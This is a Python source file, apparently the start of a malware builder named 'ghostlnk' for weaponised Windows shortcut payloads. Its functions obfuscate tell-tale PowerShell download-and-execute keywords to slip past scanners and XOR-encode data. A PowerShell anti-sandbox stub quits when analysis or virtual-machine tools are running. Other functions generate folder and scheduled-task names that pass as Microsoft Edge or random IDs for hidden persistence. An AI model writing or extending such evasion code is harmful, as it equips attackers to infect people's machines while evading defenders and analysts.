import os
import json
import base64
import uuid
import random
from datetime import datetime

CONFIG_FILE = "ghostlnk_config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"recent_urls": [], "recent_conversions": []}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def xor_encode(data: bytes, key: bytes) -> bytes:
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def obfuscate_strings(script: str) -> str:
    suspicious = ["powershell", "PowerShell", "http://", "https://",
                  "Invoke-Expression", "iex", "DownloadFile", "WebClient"]
    result = script
    for s in suspicious:
        if s in result:
            parts = [f"'{s[i:i+2]}'" for i in range(0, len(s), 2)]
            replacement = "(" + "+".join(parts) + ")"
            result = result.replace(s, replacement)
    return result

def build_antisanbox_stub() -> str:
    return r'''
$bad=@('wireshark','procmon','procexp','vboxservice','vmtoolsd','vboxtray','xenservice','sandboxie','sbiesvc');
$p=Get-Process -ErrorAction SilentlyContinue;
foreach($b in $bad){if($p.Name -match $b){exit}};
'''

def generate_random_folder_name() -> str:
    return f"MicrosoftEdge_{random.randint(10000,99999)}"

def generate_task_name() -> str:
    return str(uuid.uuid4())
